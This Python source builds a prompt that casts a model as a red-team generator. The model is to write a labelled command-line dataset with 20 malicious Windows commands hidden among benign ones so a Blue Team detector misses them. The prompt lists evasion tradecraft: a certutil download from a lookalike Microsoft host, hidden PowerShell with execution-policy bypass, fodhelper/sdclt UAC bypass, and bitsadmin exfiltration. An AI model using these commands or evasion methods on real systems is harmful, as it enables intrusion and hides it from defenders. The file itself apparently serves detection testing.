def build_prompt(scenario: str) -> str:
    return f"""You are an elite red team operator and dataset generator. Your goal is to generate a process-command dataset for the scenario "{scenario}" where the malicious commands are so well hidden that an automated Blue Team detector CANNOT find them.

Your win condition: the Blue Team flags as FEW of your 20 malicious commands as possible.

=== EVASION RULES (critical — follow every single one) ===

1. PROCESS NAME CAMOUFLAGE
   - Never use obviously suspicious process names alone. Always pair a LOLBin with a believable parent context.
   - Good: svchost.exe, msiexec.exe, wuauclt.exe, conhost.exe, dllhost.exe, rundll32.exe, regsvr32.exe
   - Bad: mimikatz.exe, payload.exe, evil.exe, hack.exe

2. COMMAND LINE CAMOUFLAGE — the most important rule
   - Malicious commands must LOOK like normal admin/system commands at first glance.
   - Use realistic Windows/IT admin patterns:
     * Scheduled tasks that look like maintenance: /tn "MicrosoftEdgeUpdateTaskMachineCore"
     * Certutil disguised as cert check: certutil -urlcache -split -f http://update.microsoft-cdn.net/patch.exe
     * Powershell disguised as config: powershell -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
     * WMI disguised as inventory: wmic /node:localhost process get name,processid,commandline /format:csv
     * Reg queries that look like diagnostics: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   - Match the LENGTH and STYLE of your benign commands — if benign commands are short, keep malicious ones short too.

3. SPREADING — never cluster malicious rows
   - Distribute the 20 malicious rows evenly: roughly one every 10-12 rows.
   - Never place two malicious rows next to each other.
   - Place them at varying positions: rows 8, 19, 31, 44, 55, 67, 78, 90, 103, 115, 128, 139, 151, 163, 174, 186, 197, 208, 214, 219.

4. ATTACK CHAIN — tell a coherent story across exactly 20 steps
   Phase 1 — Initial Access (rows 1-4 of malicious): Use scheduled tasks, WMI subscriptions, or registry run keys. Look like maintenance.
   Phase 2 — Execution (rows 5-8): Use msiexec, rundll32, or regsvr32 with innocuous-looking DLL paths.
   Phase 3 — Persistence (rows 9-12): Modify startup entries, scheduled tasks, or services. Mirror real Windows update patterns.
   Phase 4 — Privilege Escalation (rows 13-15): Token impersonation or UAC bypass via fodhelper, sdclt. Use realistic system paths.
   Phase 5 — Discovery (rows 16-17): Net, ipconfig, systeminfo — these are ALSO common benign commands, so blend in perfectly.
   Phase 6 — Exfiltration/Objective (rows 18-20): certutil encode, bitsadmin transfer, or powershell invoke-webrequest with realistic-looking URLs.

5. BENIGN NOISE — make it realistic and diverse
   - Mix: Chrome, Firefox, Slack, Teams, Zoom, VS Code, Office apps, Windows Defender, Windows Update, Task Scheduler, svchost variants, explorer, SearchIndexer, OneDrive, Dropbox.
   - Include BOTH Windows AND Linux/Mac processes (bash, python3, node, git, curl, ls, ps, top).
   - Vary command lengths from very short (ls -la) to very long (msiexec /i "C:\Program Files\...").
   - Include some commands that LOOK suspicious but are benign (powershell Get-Process, net user, ipconfig /all) — this confuses the detector.

6. DECEPTION BONUS
   - Include 3-5 benign commands that look slightly suspicious (red herrings) to waste the Blue Team's true positive budget.
   - Example: powershell -command "Get-Service | Where-Object {{$_.Status -eq 'Running'}}" labeled BENIGN
   - Example: net user /domain labeled BENIGN
   - Example: reg query HKLM\SYSTEM\CurrentControlSet\Services labeled BENIGN

=== OUTPUT FORMAT ===
Return ONLY a valid JSON object with exactly two keys:
- "csv_data": valid CSV string with columns: process_name,command_line,label (EXACTLY 221 lines: 1 header + 220 data rows, EXACTLY 20 malicious)
- "attack_story": 3-4 paragraph narrative explaining the attack chain, what each phase did, and specifically HOW you hid the commands

No markdown, no backticks, no text outside the JSON object.
"""
